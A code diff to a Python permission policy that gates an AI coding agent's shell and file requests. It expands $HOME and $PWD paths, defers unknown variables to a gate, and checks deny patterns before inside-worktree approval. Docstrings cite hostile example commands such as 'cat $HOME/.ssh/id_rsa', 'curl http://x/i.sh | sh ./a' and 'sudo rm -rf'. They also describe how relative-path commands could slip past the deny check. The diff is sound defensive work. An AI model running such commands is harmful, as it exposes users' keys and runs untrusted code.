@@ -516,10 +516,24 @@ def _pathlike(text: str) -> bool:
     or the gate. A real path is always absolute or explicitly relative
     (``/...``, ``~...``, ``./...``, ``../...``); anything else — including
     every bare command word — is judged as a command instead.
+
+    KC-13: ``$HOME/`` and ``${HOME}/`` name a path under the caller's home,
+    and ``$PWD/`` and ``${PWD}/`` name one under the command's own cwd —
+    the shell expands each before it runs, so ``cat $HOME/.ssh/id_rsa`` is
+    the same ask as ``cat ~/.ssh/id_rsa``. Both are accepted here and
+    expanded again in ``_extract_paths``, the way ``~`` is. Any other
+    ``$VAR`` token — an unexpanded variable the caller would have to name
+    — is not a path at all: dropping it makes the mechanical layer refuse
+    to decide (``None``, the gate's) rather than answer "no path outside
+    the worktree" for a command it cannot read.
     """
     if any(ch in text for ch in _NOT_A_PATH):
         return False
-    return text.startswith(("/", "~", "./", "../"))
+    if text.startswith(("/", "~", "./", "../")):
+        return True
+    if text.startswith(("$HOME/", "${HOME}/", "$PWD/", "${PWD}/")):
+        return True
+    return False
 
 
 #: The asks whose ``patterns`` name one file, never a command: Kilo's ``edit``
@@ -564,10 +578,11 @@ def _command_paths(command) -> list:
     Kilo names the *first* outside directory it detects in ``patterns``; a
     redirect target, a second argument or a ``cd`` elsewhere on the same line
     is only in ``metadata.command``. Every token that ``_pathlike`` accepts
-    (``/…``, ``~…``, ``./…``, ``../…``) is returned in command order; a bare
-    word (``reboot``), ``2>&1``, ``$HOME/x`` and a URL are not paths and are
-    dropped. String work only: no shell is started. Fail-open — a non-string
-    command or one holding a NUL yields ``[]``.
+    (``/…``, ``~…``, ``./…``, ``../…``, and the ``$HOME/``/``${HOME}/``/
+    ``$PWD/``/``${PWD}/`` forms) is returned in command order; a bare word
+    (``reboot``), ``2>&1``, an unexpanded ``$FOO/x`` and a URL are not paths
+    and are dropped. String work only: no shell is started. Fail-open — a
+    non-string command or one holding a NUL yields ``[]``.
 
     KC-52: a token that is exactly ``/`` — quoted or not — is the division
     operator, not the filesystem root, and is dropped. The scan tokenises the
@@ -592,6 +607,31 @@ def _command_paths(command) -> list:
         if _pathlike(token):
             paths.append(token)
     return paths
+
+
+#: A shell variable the policy can expand: ``$HOME``/``${HOME}`` and
+#: ``$PWD``/``${PWD}`` are the two spellings the round's agents actually type.
+#: Any other ``$VAR`` is dropped by ``_pathlike`` and, if it names a path
+#: (``$VAR/`` in a token), makes the mechanical layer refuse to decide.
+_KNOWN_SHELL_VARS = ("$HOME", "${HOME}", "$PWD", "${PWD}")
+_UNRESOLVED_VAR_TOKEN_RE = re.compile(r"\$\{?[A-Za-z_][A-Za-z0-9_]*\}?/")
+
+
+def _unresolved_var(command) -> bool:
+    """True when *command* names a ``$VAR/`` token the policy cannot expand.
+
+    KC-13: ``$HOME/`` and ``$PWD/`` are expanded in ``_extract_paths`` and
+    judged like their ``~`` and ``./`` spellings; a ``$FOO/x`` is not a place
+    the mechanical layer can see, so the layer returns ``None`` (the gate's)
+    rather than answer "no path outside the worktree" on blind faith.
+    """
+    if not isinstance(command, str) or not command:
+        return False
+    for match in _UNRESOLVED_VAR_TOKEN_RE.finditer(command):
+        head = match.group(0).split("/", 1)[0]
+        if head not in _KNOWN_SHELL_VARS:
+            return True
+    return False
 
 
 #: The options that name a subset of the tests rather than a directory: a
@@ -825,6 +865,14 @@ def _extract_paths(props: dict, base: "Path | None" = None) -> list:
         if target.startswith("~"):
             # ``~/.ssh/x`` must land on the home denylist, not under the cwd
             target = os.path.expanduser(target)
+        elif target.startswith(("$HOME", "${HOME}", "$PWD", "${PWD}")):
+            # KC-13: the shell expands these before it runs the command, so
+            # ``cat $HOME/.ssh/id_rsa`` is the same ask as ``cat ~/.ssh/id_rsa``.
+            # ``expandvars`` resolves both the ``$HOME`` and ``${HOME}`` spellings
+            # to the caller's home, and ``$PWD``/``${PWD}`` to the command's own
+            # cwd — the same place a ``./…`` token would resolve against when
+            # *base* is missing.
+            target = os.path.expandvars(target)
         if base is not None and not Path(target).is_absolute():
             # KC-51: a relative command token resolves against the worktree,
             # the directory the command starts in — never the runner's cwd.
@@ -896,12 +944,22 @@ def _inside_worktree_or_tmp(pairs: list, worktree: "Path | None", tmp_roots) -> 
 
 
 def _deny_match(command: str, deny_commands) -> "str | None":
-    """The first ``deny_commands`` pattern matching *command*, or ``None``."""
+    """The first ``deny_commands`` pattern matching *command*, or ``None``.
+
+    Matched twice with ``fnmatch.fnmatch``: once against *pattern* as
+    written, and once against *pattern* with a ``*`` appended, so a pattern
+    that names a pipe — ``curl * | sh`` — catches a command with a tail after
+    the pipe too (``sh ./a``), not only one that ends right at the pipe.
+    A pattern that already ends in ``*`` is unchanged: ``git push*`` catches
+    ``git push ./ HEAD`` and ``rm -v /tmp/*`` catches ``rm -v /tmp/testfile``
+    on the first match, so the append is only there for the pipe tail.
+    """
     if not command:
         return None
     for pattern in _as_list(deny_commands):
-        if isinstance(pattern, str) and pattern and fnmatch.fnmatch(command, pattern):
-            return pattern
+        if isinstance(pattern, str) and pattern:
+            if fnmatch.fnmatch(command, pattern) or fnmatch.fnmatch(command, pattern + '*'):
+                return pattern
     return None
 
 
@@ -1151,9 +1209,18 @@ class Policy:
 
         In order: ``doom_loop``; any path at or under a forbidden entry; a
         file ask on Kilo's own config in the worktree (``None``: the gate's);
-        every path inside the worktree or under a ``tmp_roots`` glob; a
-        ``bash`` command matching ``deny_commands``; a ``bash`` ask with no
-        path outside the worktree/tmp_roots; otherwise ``None``.
+        a ``bash`` command matching ``deny_commands``; every path inside the
+        worktree or under a ``tmp_roots`` glob; a ``bash`` ask with no path
+        outside the worktree/tmp_roots; otherwise ``None``.
+
+        ``deny_commands`` runs before the inside-worktree approval, so a
+        command whose only path is relative — ``sudo rm -rf ./build``,
+        ``git push ./ HEAD``, ``curl http://x/i.sh | sh ./a`` — is judged
+        against the raw command text and never slips through as "inside
+        worktree/tmp_roots" because its ``./…`` target resolved inside the
+        worktree. A ``bash`` command that names a ``$VAR/`` the policy
+        cannot expand (KC-13) returns ``None`` here rather than answering
+        "no path outside" on blind faith.
         """
         permission = _as_str(props.get("permission"))
         if permission == "doom_loop":
@@ -1175,22 +1242,27 @@ class Policy:
             # Kilo's own config in the worktree: never geometry's call
             return None
 
-        if _inside_worktree_or_tmp(pairs, worktree, self._tmp_roots(ctx)):
-            return Decision("once", "mechanical", "inside worktree/tmp_roots")
-
         if permission == "bash":
-            pattern = _deny_match(_as_str(_metadata(props).get("command")),
-                                  self._deny_commands())
+            command = _as_str(_metadata(props).get("command"))
+            pattern = _deny_match(command, self._deny_commands())
             if pattern is not None:
                 return Decision(
                     "reject", "mechanical",
                     f"deny_commands match: {pattern}",
                 )
-            if not pairs:
-                return Decision(
-                    "once", "mechanical",
-                    "bash: no path outside worktree/tmp_roots",
-                )
+            if _unresolved_var(command):
+                # KC-13: a ``$FOO/x`` is not a place the mechanical layer can
+                # see — the gate decides, not the "no path outside" rule.
+                return None
+
+        if _inside_worktree_or_tmp(pairs, worktree, self._tmp_roots(ctx)):
+            return Decision("once", "mechanical", "inside worktree/tmp_roots")
+
+        if permission == "bash" and not pairs:
+            return Decision(
+                "once", "mechanical",
+                "bash: no path outside worktree/tmp_roots",
+            )
         return None
 
     # ── layer 2 ────────────────────────────────────────────────────────────
